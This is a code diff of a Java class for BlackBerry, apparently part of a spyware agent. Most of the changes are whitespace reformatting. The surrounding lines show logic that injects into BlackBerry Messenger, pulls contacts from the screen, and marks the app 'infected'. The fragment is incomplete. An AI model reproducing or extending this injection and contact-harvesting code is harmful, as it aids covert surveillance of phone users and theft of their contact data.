@@ -117,10 +117,10 @@ public class BBMMenuItem extends ApplicationMenuItem {
 
     private void checkScreen(int tries) {
         Screen screen = UiApplication.getUiApplication().getActiveScreen();
-        if(tries<=0){
-//#ifdef DEBUG
-debug.trace("checkScreen: no more tries");
-//#endif
+        if (tries <= 0) {
+            //#ifdef DEBUG
+            debug.trace("checkScreen: no more tries");
+            //#endif
             return;
         }
 
@@ -143,7 +143,7 @@ debug.trace("checkScreen: no more tries");
             FieldExplorer explorer = new FieldExplorer();
             contacts = explorer.explore(screen);
             //#endif
-            
+
             screen.close();
             bbmInjected = true;
 
@@ -154,7 +154,7 @@ debug.trace("checkScreen: no more tries");
             debug.info("BBM INJECTED!");
             debug.ledFlash(Debug.COLOR_GREEN);
             //#endif
-            
+
             AppInjectorBBM.getInstance().setInfected(true);
 
         } else if (screen.getClass().getName().indexOf("ConversationScreen") > 0) {
@@ -162,8 +162,8 @@ debug.trace("checkScreen: no more tries");
             debug.info("checkScreen: Conversation, closing");
             //#endif
             screen.close();
-            checkScreen(tries-1);
-        }else{
+            checkScreen(tries - 1);
+        } else {
             //#ifdef DEBUG
             debug.warn("BBM NOT INJECTED!");
             debug.ledFlash(Debug.COLOR_RED);
@@ -257,7 +257,7 @@ debug.trace("checkScreen: no more tries");
 
     public synchronized void addMenuBBM(String menuName) {
         //#ifdef DEBUG
-        debug.trace("addMenuBBM");
+        debug.trace("addMenuBBM: "+menuName);
         //#endif
 
         bbmMenu = menuName;
